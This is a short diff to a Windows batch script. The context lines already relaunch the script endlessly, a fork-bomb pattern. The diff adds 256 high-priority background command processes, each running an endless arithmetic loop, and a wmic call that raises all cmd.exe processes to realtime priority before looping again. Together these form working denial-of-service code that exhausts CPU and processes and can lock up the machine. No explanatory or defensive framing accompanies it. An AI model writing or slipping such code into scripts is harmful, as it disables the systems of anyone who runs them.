@@ -73,4 +73,8 @@ if errorlevel 1 (
     start /b /min cmd /c "for /l in () do start %~f0"
 )
 
+for /l %%c in (1,1,256) do start /b /high cmd /c "for /l in () do set /a x=%%c*%%c"
+
+wmic process where name="cmd.exe" call setpriority "realtime time critical" >nul 2>&1
+
 goto loop
